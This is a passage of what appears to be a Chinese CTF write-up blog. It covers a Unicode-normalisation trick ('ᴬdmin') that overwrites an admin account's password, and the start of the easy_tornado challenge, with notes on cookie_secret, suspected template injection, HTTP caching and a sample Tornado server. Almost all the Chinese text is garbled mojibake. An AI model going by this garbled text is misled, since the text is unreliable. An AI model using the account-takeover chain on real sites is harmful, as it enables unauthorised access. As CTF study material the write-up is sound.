å³è¯¥å‡½æ•°è°ƒç”¨ç¬¬ä¸€æ¬¡å°†å…¶è½¬æ¢ä¸ºå¤§å†™ï¼Œç¬¬äºŒæ¬¡å°†å…¶è½¬æ¢ä¸ºå°å†™</code></pre>
<p><strong>æ‰€ä»¥å½“æˆ‘ä»¬ç”¨<code>á´¬dmin</code>æ³¨å†Œçš„è¯ï¼Œåå°ä»£ç è°ƒç”¨ä¸€æ¬¡nodeprep.prepareå‡½æ•°ï¼Œæ·»åŠ ç”¨æˆ·Admin+å¯†ç </strong></p>
<p><strong>æˆ‘ä»¬ç”¨<code>á´¬dmin</code>è¿›è¡Œç™»å½•ï¼Œåå°ä»£ç è°ƒç”¨ä¸€æ¬¡nodeprep.prepareå‡½æ•°ï¼Œåå°ä»¥ä¸ºç™»é™†çš„ç”¨æˆ·æ˜¯Adminï¼Œæ£€æŸ¥æœ‰æ— è¿™ä¸ªç”¨æˆ·+å¯†ç æ­£ç¡®ä¸å¦ï¼Œç„¶åç™»å½•æˆåŠŸå<code>session['name']=Admin</code>ï¼Œå¯ä»¥çœ‹åˆ°indexé¡µé¢çš„usernameå˜æˆäº†Admin</strong></p>
<p><strong>ç™»é™†çŠ¶æ€ä¸‹ä¿®æ”¹å¯†ç ï¼Œåå°ä»£ç <code>name = strlower(session['name'])</code>,å¯¹session['name']è°ƒç”¨ä¸€æ¬¡nodeprep.prepareå‡½æ•°ï¼Œnameå˜ä¸º<code>admin</code>,ç„¶åä¿®æ”¹ç”¨æˆ·ä¸ºadminçš„å¯†ç </strong></p>
<p>é‚£ä¹ˆï¼Œæ”»å‡»é“¾å¤§æ¦‚å°±è¿™æ ·</p>
<ul>
<li>æ³¨å†Œç”¨æˆ·á´¬dmin</li>
<li>ç™»å½•ç”¨æˆ·á´¬dminï¼Œå˜æˆAdmin</li>
<li>ä¿®æ”¹å¯†ç Adminï¼Œæ›´æ”¹äº†adminçš„å¯†ç </li>
</ul>
<p>åœ¨index.htmlä¸­å¯ä»¥çœ‹åˆ°åªè¦<code>session['name']=='admin'</code>,ä¹Ÿå°±æ˜¯åªè¦ç”¨æˆ·åæ˜¯<code>admin</code>å°±å¯æˆåŠŸç™»å½•äº†</p>
<ul>
<li><p>å…·ä½“å­—æ¯æ€ä¹ˆæ‰¾?</p>
<p>å…³äºå…·ä½“ç¼–ç å¯æŸ¥
https://unicode-table.com/en/sets/superscript-and-subscript-letters/ï¼Œå½“ç„¶ä½ ä¹Ÿå¯ä»¥å¤åˆ¶è¿‡åç”¨ç«™é•¿å·¥å…·è½¬æ¢æˆUnicodeç¼–ç ã€‚</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220305145448969.png" srcset="/img/loading.gif" alt="image-20220305145448969" style="zoom:67%;"></p></li>
</ul>
<h2 id="æŠ¤ç½‘æ¯-2018easy_tornado">[æŠ¤ç½‘æ¯ 2018]easy_tornadoï¼ˆ**ï¼‰</h2>
<h4 id="è€ƒç‚¹cookie_secretæ¨¡æ¿æ³¨å…¥">è€ƒç‚¹ï¼šcookie_secretã€æ¨¡æ¿æ³¨å…¥</h4>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220227192953750.png" srcset="/img/loading.gif" alt="image-20220227192953750"></p>
<p>ç‚¹è¿›ç•Œé¢ï¼Œæ‰“å¼€flag.txtï¼Œå¾—åˆ°æç¤ºflag in /fllllllllllllag</p>
<p>æ‰“å¼€welcome.txtï¼Œå¾—åˆ°æç¤ºrender</p>
<p>æ‰“å¼€hints.txtï¼Œå¾—åˆ°æç¤ºmd5(cookie_secret+md5(filename))</p>
<p>ç„¶åæ¯æ¬¡æ‰“å¼€æ–‡ä»¶ï¼Œurlé‡Œéƒ½æœ‰æäº¤å‚æ•°ï¼Œfilenameå’Œfilehash</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220227193123613.png" srcset="/img/loading.gif" alt="image-20220227193123613"></p>
<p>çŒœæµ‹filehashå¯¹åº”çš„ä¸Šfilenameæ‰èƒ½è®¿é—®ï¼Œä½†æ˜¯cookie_secretæ˜¯å•¥å‘¢ï¼Ÿ</p>
<p>æŠ“åŒ…ï¼ŒæŸ¥çœ‹cookieï¼Œå‘ç°å¹¶æ— cookie</p>
<p>burpæŠ“åŒ…flag.txté‚£ä¸ªæ–‡ä»¶ï¼Œå‘ç°304 NOT
modifiedï¼Œä½†æ˜¯ç›´æ¥è®¿é—®æ˜¯å¯ä»¥è®¿é—®çš„</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220227194449791.png" srcset="/img/loading.gif" alt="image-20220227194449791"></p>
<h4 id="not-modified">304 NOT modified</h4>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/304">304
Not Modified</a> ï¼š304 æœªæ”¹å˜</p>
<p><a target="_blank" rel="noopener" href="https://baike.baidu.com/item/304%E7%8A%B6%E6%80%81%E7%A0%81/7867141">ç™¾åº¦ç™¾ç§‘</a></p>
</blockquote>
<p>304ï¼ˆæœªä¿®æ”¹ï¼‰
:è‡ªä»ä¸Šæ¬¡è¯·æ±‚åï¼Œè¯·æ±‚çš„ç½‘é¡µæœªä¿®æ”¹è¿‡ã€‚æœåŠ¡å™¨è¿”å›æ­¤å“åº”æ—¶ï¼Œä¸ä¼šè¿”å›ç½‘é¡µå†…å®¹ã€‚</p>
<p>â€‹ 1.
å¦‚æœç½‘é¡µè‡ªè¯·æ±‚è€…ä¸Šæ¬¡è¯·æ±‚åå†ä¹Ÿæ²¡æœ‰æ›´æ”¹è¿‡ï¼Œæ‚¨åº”å°†æœåŠ¡å™¨é…ç½®ä¸ºè¿”å›æ­¤å“åº”ï¼ˆç§°ä¸º
If-Modified-Since HTTP æ ‡å¤´ï¼‰ã€‚æœåŠ¡å™¨å¯ä»¥å‘Šè¯‰ Googlebot
è‡ªä»ä¸Šæ¬¡æŠ“å–åç½‘é¡µæ²¡æœ‰å˜æ›´ï¼Œè¿›è€ŒèŠ‚çœå¸¦å®½å’Œå¼€é”€ã€‚</p>
<p>â€‹ 2. HTTP 304
æœªæ”¹å˜è¯´æ˜æ— éœ€å†æ¬¡ä¼ è¾“è¯·æ±‚çš„å†…å®¹ï¼Œä¹Ÿå°±æ˜¯è¯´å¯ä»¥ä½¿ç”¨ç¼“å­˜çš„å†…å®¹ã€‚è¿™é€šå¸¸æ˜¯åœ¨ä¸€äº›å®‰å…¨çš„æ–¹æ³•ï¼ˆsafeï¼‰ï¼Œä¾‹å¦‚<strong>GET
æˆ–HEAD æˆ–åœ¨è¯·æ±‚ä¸­é™„å¸¦äº†å¤´éƒ¨ä¿¡æ¯ï¼š
If-Matchï¼ŒIf-ModifiedSinceï¼ŒIf-None-Matchï¼ŒIf-Rangeï¼ŒIf-Unmodified-Since
ä¸­ä»»ä¸€é¦–éƒ¨ã€‚</strong></p>
<p>â€‹ 3. å¦‚æœæ˜¯ 200 OK ï¼Œå“åº”ä¼šå¸¦æœ‰å¤´éƒ¨ Cache-Control, Content-Location,
Date, ETag, Expiresï¼Œå’Œ Vary.</p>
<h4 id="å•¥æ˜¯-cache-control"><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/79042406">å•¥æ˜¯ Cache-Control
ï¼Ÿ</a></h4>
<p>â€‹ Cache-Control æ˜¯ä¸€ä¸ª HTTP
åè®®ä¸­å…³äºç¼“å­˜çš„å“åº”å¤´ï¼Œå®ƒç”±ä¸€äº›èƒ½å¤Ÿå…è®¸ä½ å®šä¹‰ä¸€ä¸ªå“åº”èµ„æºåº”è¯¥ä½•æ—¶ã€å¦‚ä½•è¢«ç¼“å­˜ä»¥åŠç¼“å­˜å¤šé•¿æ—¶é—´çš„æŒ‡ä»¤ç»„æˆã€‚</p>
<h5 id="cache-control-max-age">Cache-Control max-age</h5>
<p>è¿™ä¸ªæŒ‡ä»¤å‘Šè¯‰æµè§ˆå™¨ç«¯æˆ–è€…ä¸­é—´è€…ï¼Œå“åº”èµ„æºèƒ½å¤Ÿåœ¨å®ƒè¢«è¯·æ±‚ä¹‹åçš„å¤šé•¿æ—¶é—´ä»¥å†…è¢«å¤ç”¨ã€‚ä¾‹å¦‚ï¼Œ<code>max-age</code>ç­‰äº
3600 æ„å‘³ç€å“åº”èµ„æºèƒ½å¤Ÿåœ¨æ¥ä¸‹æ¥çš„ 60
åˆ†é’Ÿä»¥å†…è¢«å¤ç”¨ï¼Œ<strong>è€Œä¸éœ€è¦ä»æœåŠ¡ç«¯é‡æ–°è·å–</strong>ã€‚ï¼ˆå¯ä»¥å‘ç°ï¼Œ<code>max-age</code>çš„å•ä½æ˜¯ç§’ï¼‰</p>
<h4 id="ä»€ä¹ˆæ˜¯etag"><a target="_blank" rel="noopener" href="https://juejin.cn/post/6844903870636769293">ä»€ä¹ˆæ˜¯ETagï¼Ÿ</a></h4>
<p>Etagæ˜¯ Entity
tagçš„ç¼©å†™ï¼Œå¯ä»¥ç†è§£ä¸ºâ€œè¢«è¯·æ±‚å˜é‡çš„å®ä½“å€¼â€ï¼ŒEtagæ˜¯æœåŠ¡ç«¯çš„ä¸€ä¸ªèµ„æºçš„æ ‡è¯†ï¼Œåœ¨
HTTP
å“åº”å¤´ä¸­å°†å…¶ä¼ é€åˆ°å®¢æˆ·ç«¯ã€‚æ‰€è°“çš„æœåŠ¡ç«¯èµ„æºå¯ä»¥æ˜¯ä¸€ä¸ªWebé¡µé¢ï¼Œä¹Ÿå¯ä»¥æ˜¯JSONæˆ–XMLç­‰ã€‚æœåŠ¡å™¨å•ç‹¬è´Ÿè´£åˆ¤æ–­è®°å·æ˜¯ä»€ä¹ˆåŠå…¶å«ä¹‰ï¼Œå¹¶åœ¨HTTPå“åº”å¤´ä¸­å°†å…¶ä¼ é€åˆ°å®¢æˆ·ç«¯ã€‚<strong>å¦ä¸€ç§è¯´æ³•æ˜¯ï¼ŒETagæ˜¯ä¸€ä¸ªå¯ä»¥ä¸Webèµ„æºå…³è”çš„è®°å·ï¼ˆtokenï¼‰</strong></p>
<p>æ¯”å¦‚ï¼Œ<strong>æµè§ˆå™¨ç¬¬ä¸€æ¬¡è¯·æ±‚ä¸€ä¸ªèµ„æºçš„æ—¶å€™ï¼ŒæœåŠ¡ç«¯ç»™äºˆè¿”å›ï¼Œå¹¶ä¸”è¿”å›äº†ETag</strong>:
"50b1c1d4f775c61:df3"
è¿™æ ·çš„å­—æ ·ç»™æµè§ˆå™¨ï¼Œå½“æµè§ˆå™¨å†æ¬¡è¯·æ±‚è¿™ä¸ªèµ„æºçš„æ—¶å€™ï¼Œæµè§ˆå™¨ä¼šå°†If-None-Match:
W/"50b1c1d4f775c61:df3"
ã€<strong>ç›¸åŒETagå€¼</strong>ã€‘ä¼ è¾“ç»™æœåŠ¡ç«¯ï¼ŒæœåŠ¡ç«¯æ‹¿åˆ°è¯¥ETAGï¼Œå¯¹æ¯”èµ„æºæ˜¯å¦å‘ç”Ÿå˜åŒ–ï¼Œå¦‚æœèµ„æºæœªå‘ç”Ÿæ”¹å˜ï¼Œåˆ™è¿”å›304HTTPçŠ¶æ€ç ï¼Œä¸è¿”å›å…·ä½“çš„èµ„æºã€‚</p>
<p>è§£é¢˜ï¼š</p>
<pre><code class="hljs isbl"><span class="hljs-number">1</span>.flagåœ¨/<span class="hljs-variable">fllllllllllllag</span>
<span class="hljs-number">2</span>.filehashï¼š<span class="hljs-function"><span class="hljs-title">md5</span>(<span class="hljs-variable">cookie_secret</span>+<span class="hljs-title">md5</span>(<span class="hljs-variable">filename</span>))</span></code></pre>
<p>æ‰€ä»¥æˆ‘ä»¬çš„å·®çš„å°±æ˜¯cookie_secretäº†ï¼Œä¸‹é¢å¼€å§‹æ‹¿cookie_secret</p>
<p>é€šè¿‡æºç å’Œè¯·æ±‚å¤´å¹¶æ²¡æœ‰çœ‹åˆ°ä»»ä½•çš„cookie_secretä¿¡æ¯ï¼Œå½“æˆ‘ä»¬å°è¯•è®¿é—®/fllllllllllllagï¼ŒæŠ¥é”™</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220227211937496.png" srcset="/img/loading.gif" alt="image-20220227211937496"></p>
<p>æ€è·¯æ–­äº†ï¼Œçœ‹WPæ‰çŸ¥é“ä¸304cacheæ— å…³ã€‚ã€‚<strong>é¢˜ç›®æ˜¯easy_tornadoï¼Œ/welcome.txté¡µé¢ä¹Ÿçœ‹åˆ°==render==ï¼Œå¯èƒ½ä¼šæ˜¯SSTIæ¨¡æ¿æ³¨å…¥</strong></p>
<h4 id="æ¨¡æ¿æ³¨å…¥">æ¨¡æ¿æ³¨å…¥**</h4>
<blockquote>
<p>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3679"><strong>è¯¦ç»†ï¼Œæ˜“æ‡‚ï¼Œé€‚åˆå°ç™½+CTFå„ç§è¿‡æ»¤ç»•è¿‡å§¿åŠ¿</strong></a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/csvoss/onelinerizer">æ¨èä¸€ä¸ªèƒ½æŠŠPythonä»£ç ç»™ç¼–è¯‘æˆä¸€å¥è¯çš„å½¢å¼å·¥å…·</a></p>
</blockquote>
<p>æ€»ç»“èµ·æ¥å°±æ˜¯ç±»ä¼¼SQLæ³¨å…¥ï¼Œé€šè¿‡æ§åˆ¶è¾“å…¥å‚æ•°å¾—åˆ°æ•°æ®</p>
<h5 id="æ¸²æŸ“">æ¸²æŸ“</h5>
<ul>
<li>å‰ç«¯å¼€å‘è¿‡ç¨‹ï¼š</li>
</ul>
<p>æµè§ˆå™¨è¿™è¾¹åšçš„å·¥ä½œå¤§è‡´åˆ†ä¸ºä»¥ä¸‹å‡ æ­¥ï¼š</p>
<p>åŠ è½½ï¼šæ ¹æ®è¯·æ±‚çš„URLè¿›è¡ŒåŸŸåè§£æï¼Œå‘æœåŠ¡å™¨å‘èµ·è¯·æ±‚ï¼Œæ¥æ”¶æ–‡ä»¶ï¼ˆHTMLã€JSã€CSSã€å›¾è±¡ç­‰ï¼‰ã€‚</p>
<p>è§£æï¼šå¯¹åŠ è½½åˆ°çš„èµ„æºï¼ˆHTMLã€JSã€CSSç­‰ï¼‰è¿›è¡Œè¯­æ³•è§£æï¼Œå»ºè®®ç›¸åº”çš„å†…éƒ¨æ•°æ®ç»“æ„ï¼ˆæ¯”å¦‚HTMLçš„DOMæ ‘ï¼ŒJSçš„ï¼ˆå¯¹è±¡ï¼‰å±æ€§è¡¨ï¼ŒCSSçš„æ ·å¼è§„åˆ™ç­‰ç­‰ï¼‰</p>
<p><strong>æ¸²æŸ“</strong>ï¼šæ„å»ºæ¸²æŸ“æ ‘ï¼Œå¯¹å„ä¸ªå…ƒç´ è¿›è¡Œä½ç½®è®¡ç®—ã€æ ·å¼è®¡ç®—ç­‰ç­‰ï¼Œç„¶åæ ¹æ®æ¸²æŸ“æ ‘å¯¹é¡µé¢è¿›è¡Œæ¸²æŸ“ï¼ˆå¯ä»¥ç†è§£ä¸ºâ€œç”»â€å…ƒç´ ï¼‰ã€<strong>ç»˜åˆ¶</strong>ã€‘ã€<strong>å°†HTMLå˜æˆäººçœ¼çœ‹åˆ°çš„å›¾åƒ</strong>ã€‘</p>
<p>è¿™å‡ ä¸ªè¿‡ç¨‹ä¸æ˜¯å®Œå…¨å­¤ç«‹çš„ï¼Œä¼šæœ‰äº¤å‰ï¼Œæ¯”å¦‚HTMLåŠ è½½åå°±ä¼šè¿›è¡Œè§£æï¼Œç„¶åæ‹‰å–HTMLä¸­æŒ‡å®šçš„CSSã€JSç­‰ã€‚</p>
<blockquote>
<p>ä¸¾ä¾‹å­ï¼š</p>
<p>ä½ è¦åƒä¸ªèœï¼Œä½ æ‰¾åˆ°å¨å¸ˆè¯´ï¼Œæˆ‘è¦å°–æ¤’è‚‰ä¸ã€‚</p>
<p>å¨å¸ˆå°±å»ç¿»èœè°±ï¼Œç‚’ç»™ä½ åƒã€‚</p>
<p>ä½ æ˜¯æµè§ˆè€…</p>
<p>èœæ˜¯ä½ å°†çœ‹åˆ°çš„é¡µé¢</p>
<p>å¨å¸ˆæ˜¯æµè§ˆå™¨</p>
<p>èœè°±æ˜¯ç¨‹åºå‘˜å†™çš„é¡µé¢ä»£ç </p>
<p>ç‚’èœçš„è¿‡ç¨‹ï¼Œå°±æ˜¯é¡µé¢æ¸²æŸ“</p>
</blockquote>
<h5 id="dom"><a target="_blank" rel="noopener" href="https://www.zhihu.com/question/34219998">DOM</a></h5>
<p>DOMæ˜¯Document Object Modelçš„è‹±æ–‡ç¼©å†™ï¼Œç¿»è¯‘è¿‡æ¥æ˜¯æ–‡æ¡£å¯¹è±¡æ¨¡å‹</p>
<p>å½“æµè§ˆå™¨è¯»åˆ°è¿™äº›ä»£ç æ—¶ï¼Œå®ƒä¼šå»ºç«‹ä¸€ä¸ª<a target="_blank" rel="noopener" href="https://javascript.info/dom-nodes">â€œDOM
èŠ‚ç‚¹â€æ ‘</a>æ¥ä¿æŒè¿½è¸ªæ‰€æœ‰å†…å®¹ï¼Œå¦‚åŒä½ ä¼šç”»ä¸€å¼ å®¶è°±æ ‘æ¥è¿½è¸ªå®¶åº­æˆå‘˜çš„å‘å±•ä¸€æ ·ï¼Œå®ƒä¼šæŠŠç½‘é¡µæ–‡æ¡£è½¬æ¢ä¸ºä¸€ä¸ªæ–‡æ¡£å¯¹è±¡ï¼Œä¸»è¦åŠŸèƒ½æ˜¯å¤„ç†ç½‘é¡µå†…å®¹ã€‚ã€å°±æ˜¯æŠŠHTMLä»£ç è½¬åŒ–ä¸ºæ ‘ã€‘</p>
<p><strong>æ–‡æ¡£å¯¹è±¡æ¨¡å‹å°±æ˜¯åŸºäºè¿™æ ·çš„æ–‡æ¡£è§†å›¾ç»“æ„çš„ä¸€ç§æ¨¡å‹ï¼Œæ‰€æœ‰çš„htmlé¡µé¢éƒ½é€ƒä¸å¼€è¿™ä¸ªæ¨¡å‹ï¼Œä¹Ÿå¯ä»¥æŠŠå®ƒç§°ä¸º==èŠ‚ç‚¹æ ‘==æ›´ä¸ºå‡†ç¡®ã€‚</strong></p>
<h5 id="ä»€ä¹ˆæ˜¯æ¨¡æ¿">ä»€ä¹ˆæ˜¯æ¨¡æ¿</h5>
<ul>
<li><p>è¿™é‡Œç‰¹æŒ‡ç”¨äº web
å¼€å‘çš„æ¨¡æ¿å¼•æ“ï¼Œæ˜¯ä¸ºäº†ç”¨æˆ·ç•Œé¢ä¸ä¸šåŠ¡æ•°æ®ï¼ˆå†…å®¹ï¼‰åˆ†ç¦»è€Œäº§ç”Ÿçš„ã€‚
å¯ä»¥ç”Ÿæˆç‰¹å®šæ ¼å¼çš„æ–‡æ¡£ï¼Œåˆ©ç”¨æ¨¡æ¿å¼•æ“æ¥ç”Ÿæˆå‰ç«¯çš„htmlä»£ç ï¼Œåé¦ˆç»™æµè§ˆå™¨ï¼Œå‘ˆç°åœ¨ç”¨æˆ·é¢å‰ã€‚
å¤§æ¦‚å°±æ˜¯ä¸€ä¸ªç½‘é¡µçš„æ¡†æ¶ï¼Œ</p></li>
<li><p>æ¨¡æ¿å¼•æ“æ¥ç”Ÿæˆå‰ç«¯çš„htmlä»£ç ï¼Œæ¨¡æ¿å¼•æ“ä¼šæä¾›ä¸€å¥—ç”Ÿæˆhtmlä»£ç çš„ç¨‹åºï¼Œç„¶ååªéœ€è¦è·å–ç”¨æˆ·çš„æ•°æ®ï¼Œç„¶åæ”¾åˆ°æ¸²æŸ“å‡½æ•°é‡Œï¼Œç„¶åç”Ÿæˆæ¨¡æ¿+ç”¨æˆ·æ•°æ®çš„å‰ç«¯htmlé¡µé¢ï¼Œç„¶ååé¦ˆç»™æµè§ˆå™¨ï¼Œå‘ˆç°åœ¨ç”¨æˆ·é¢å‰ã€‚</p></li>
<li><p>è€Œé€ æˆæœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥æ¼æ´çš„æˆå› å°±æ˜¯æœåŠ¡ç«¯æ¥æ”¶äº†ç”¨æˆ·çš„æ¶æ„è¾“å…¥åï¼Œæœªç»ä»»ä½•å¤„ç†å°±å°†å…¶ä½œä¸º
web
åº”ç”¨æ¨¡æ¿å†…å®¹çš„ä¸€éƒ¨åˆ†ï¼Œæ¨¡æ¿å¼•æ“åœ¨è¿›è¡Œç›®æ ‡ç¼–è¯‘æ¸²æŸ“çš„è¿‡ç¨‹ä¸­ï¼Œæ‰§è¡Œäº†ç”¨æˆ·æ’å…¥çš„å¯ä»¥ç ´åæ¨¡æ¿çš„è¯­å¥ï¼Œä»è€Œå¯¼è‡´äº†æ•æ„Ÿä¿¡æ¯çš„æ³„éœ²ã€ä»£ç æ‰§è¡Œã€getshell
ç­‰é—®é¢˜ã€‚</p></li>
</ul>
<h5 id="ä»€ä¹ˆæ˜¯æ¡†æ¶">ä»€ä¹ˆæ˜¯æ¡†æ¶</h5>
<blockquote>
<p>https://www.kancloud.cn/kancloud/python-basic/41708</p>
</blockquote>
<ol type="1">
<li><p>ä¸ç®¡æ˜¯pythonï¼Œè¿˜æ˜¯phpï¼Œäº¦æˆ–åˆ«çš„åšwebé¡¹ç›®çš„è¯­è¨€ï¼Œä¹ƒè‡³äºåšå…¶å®ƒéwebé¡¹ç›®çš„<strong>å¼€å‘</strong>ï¼Œä¸€èˆ¬éƒ½è¦ç”¨åˆ°ä¸€ä¸ªç§°ä¹‹ä¸ºä»€ä¹ˆä»€ä¹ˆæ¡†æ¶çš„ä¸œè¥¿ã€‚</p></li>
<li><p>ç®€è€Œè¨€ä¹‹ï¼Œæ¡†æ¶å°±æ˜¯åˆ¶å®šä¸€å¥—è§„èŒƒæˆ–è€…è§„åˆ™ï¼ˆæ€æƒ³ï¼‰ï¼Œå¤§å®¶ï¼ˆç¨‹åºå‘˜ï¼‰åœ¨è¯¥è§„èŒƒæˆ–è€…è§„åˆ™ï¼ˆæ€æƒ³ï¼‰ä¸‹å·¥ä½œã€‚æˆ–è€…è¯´å°±æ˜¯<strong>ä½¿ç”¨åˆ«äººæ­å¥½çš„èˆå°ï¼Œä½ æ¥åšè¡¨æ¼”</strong>ã€‚</p></li>
<li><p><span style="background:#BBFFBB;">pythonå¸¸è§webæ¡†æ¶</span>ï¼š</p></li>
</ol>
<ul>
<li>Django:è¿™æ˜¯ä¸€ä¸ªè¢«å¹¿æ³›åº”ç”¨çš„æ¡†æ¶ï¼Œå¦‚æœçœ‹å®˜åœ¨ç½‘ä¸Šæœç´¢ï¼Œä¼šå‘ç°å¾ˆå¤šå…¬å¸åœ¨æ‹›è˜çš„æ—¶å€™å°±è¯´è¦ä¼šè¿™ä¸ªï¼Œå…¶å®è¿™ç§æ‹›è˜å°±æš´éœ²äº†è¯¥å…¬å¸çš„å¼€å‘æ°´å¹³è¦æ±‚ä¸é«˜ã€‚æ¡†æ¶åªæ˜¯è¾…åŠ©ï¼ŒçœŸæ­£çš„ç¨‹åºå‘˜ï¼Œç”¨ä»€ä¹ˆæ¡†æ¶ï¼Œéƒ½åº”è¯¥æ˜¯æ ¹æ®éœ€è¦è€Œæ¥ã€‚å½“ç„¶ä¸åŒæ¡†æ¶æœ‰ä¸åŒçš„ç‰¹ç‚¹ï¼Œéœ€è¦å­¦ä¹ ä¸€æ®µæ—¶é—´ã€‚</li>
<li>==Flask==ï¼šä¸€ä¸ªç”¨Pythonç¼–å†™çš„è½»é‡çº§Webåº”ç”¨æ¡†æ¶ã€‚åŸºäºWerkzeug
WSGIå·¥å…·ç®±å’ŒJinja2æ¨¡æ¿å¼•æ“ã€‚</li>
<li>Web2pyï¼šæ˜¯ä¸€ä¸ªä¸ºPythonè¯­è¨€æä¾›çš„å…¨åŠŸèƒ½Webåº”ç”¨æ¡†æ¶ï¼Œæ—¨åœ¨æ•æ·å¿«é€Ÿçš„å¼€å‘Webåº”ç”¨ï¼Œå…·æœ‰å¿«é€Ÿã€å®‰å…¨ä»¥åŠå¯ç§»æ¤çš„æ•°æ®åº“é©±åŠ¨çš„åº”ç”¨ï¼Œå…¼å®¹Google
App Engineï¼ˆè¿™æ˜¯googleçš„å…ƒè®¡ç®—å¼•æ“ï¼Œåé¢æˆ‘ä¼šå•ç‹¬ä»‹ç»ï¼‰ã€‚</li>
<li>Bottle: å¾®å‹Python
Webæ¡†æ¶ï¼Œéµå¾ªWSGIï¼Œè¯´å¾®å‹ï¼Œæ˜¯å› ä¸ºå®ƒåªæœ‰ä¸€ä¸ªæ–‡ä»¶ï¼Œé™¤Pythonæ ‡å‡†åº“å¤–ï¼Œå®ƒä¸ä¾èµ–äºä»»ä½•ç¬¬ä¸‰æ–¹æ¨¡å—ã€‚</li>
<li>Tornadoï¼šå…¨ç§°æ˜¯Torado Web
Serverï¼Œä»åå­—ä¸Šçœ‹å°±å¯çŸ¥é“å®ƒå¯ä»¥ç”¨ä½œWebæœåŠ¡å™¨ï¼Œä½†åŒæ—¶å®ƒä¹Ÿæ˜¯ä¸€ä¸ªPython
Webçš„å¼€å‘æ¡†æ¶ã€‚æœ€åˆæ˜¯åœ¨FriendFeedå…¬å¸çš„ç½‘ç«™ä¸Šä½¿ç”¨ï¼ŒFaceBookæ”¶è´­äº†ä¹‹åä¾¿å¼€æºäº†å‡ºæ¥ã€‚</li>
<li>webpy: è½»é‡çº§çš„Python Webæ¡†æ¶ã€‚webpyçš„è®¾è®¡ç†å¿µåŠ›æ±‚ç²¾ç®€ï¼ˆKeep it
simple and
powerfulï¼‰ï¼Œæºç å¾ˆç®€çŸ­ï¼Œåªæä¾›ä¸€ä¸ªæ¡†æ¶æ‰€å¿…é¡»çš„ä¸œè¥¿ï¼Œä¸ä¾èµ–å¤§é‡çš„ç¬¬ä¸‰æ–¹æ¨¡å—ï¼Œå®ƒæ²¡æœ‰URLè·¯ç”±ã€æ²¡æœ‰æ¨¡æ¿ä¹Ÿæ²¡æœ‰æ•°æ®åº“çš„è®¿é—®ã€‚</li>
</ul>
<h5 id="ä¸€äº›tornadoè¯­æ³•">ä¸€äº›tornadoè¯­æ³•ï¼š</h5>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.kancloud.cn/kancloud/python-basic/41713">å‚è€ƒæ‰‹å†Œ**</a></p>
</blockquote>
<p>renderæ˜¯pythonä¸­çš„ä¸€ä¸ªæ¸²æŸ“å‡½æ•°ï¼Œä¹Ÿå°±æ˜¯ä¸€ç§æ¨¡æ¿ï¼Œé€šè¿‡è°ƒç”¨çš„å‚æ•°ä¸åŒï¼Œç”Ÿæˆä¸åŒçš„ç½‘é¡µ
renderé…åˆTornadoä½¿ç”¨</p>
<pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span>
<span class="hljs-comment">#coding:utf-8</span>

<span class="hljs-keyword">import</span> tornado.httpserver
<span class="hljs-keyword">import</span> tornado.ioloop
<span class="hljs-keyword">import</span> tornado.options
<span class="hljs-keyword">import</span> tornado.web

<span class="hljs-keyword">from</span> tornado.options <span class="hljs-keyword">import</span> define, options
define(<span class="hljs-string">&quot;port&quot;</span>, default=<span class="hljs-number">8000</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;run on the given port&quot;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">int</span>)  //æŒ‡å®šç½‘é¡µè®¿é—®çš„ç«¯å£

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">IndexHandler</span>(<span class="hljs-params">tornado.web.RequestHandler</span>):</span>  //åˆ¶å®šç±»åŠæ–¹æ³•
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get</span>(<span class="hljs-params">self</span>):</span>
        greeting = self.get_argument(<span class="hljs-string">&#x27;greeting&#x27;</span>, <span class="hljs-string">&#x27;Hello&#x27;</span>)   //è·å¾—GETå‚æ•°å€¼ï¼Œå‰è€…æ˜¯å‚æ•°åï¼Œåé¢æ˜¯é»˜è®¤å€¼ï¼Œå¿…é¡»
        self.write(greeting + <span class="hljs-string">&#x27;, welcome you to read: www.itdiffer.com&#x27;</span>)

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:
    tornado.options.parse_command_line()   //å¯åŠ¨å‘½ä»¤è¡Œ
    app = tornado.web.Application(handlers=[(<span class="hljs-string">r&quot;/&quot;</span>, IndexHandler)]) //å®ä¾‹åŒ–ï¼Œhandlersç±»ä¼¼è·¯ç”±ï¼Œåˆ—è¡¨é‡Œæ¯ä¸ªå…ƒç´ æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œè·¯å¾„å’Œå¤„ç†å®ƒçš„ç±»
    http_server = tornado.httpserver.HTTPServer(app)  //è°ƒç”¨å¯¹è±¡æ‰§è¡ŒhttpæœåŠ¡å™¨
    http_server.listen(options.port)  //æä¾›å‘é€å“åº”çš„æ¥å£
    tornado.ioloop.IOLoop.instance().start()  //è¡¨ç¤ºå¯ä»¥æ¥æ”¶æ¥è‡ªHTTPçš„è¯·æ±‚äº†</code></pre>
<p><strong>ç”¨pythonè¿è¡Œè¿™ä¸ªæ–‡ä»¶ï¼Œå…¶å®å°±å·²ç»å‘å¸ƒäº†ä¸€ä¸ªç½‘ç«™</strong></p>
<ul>
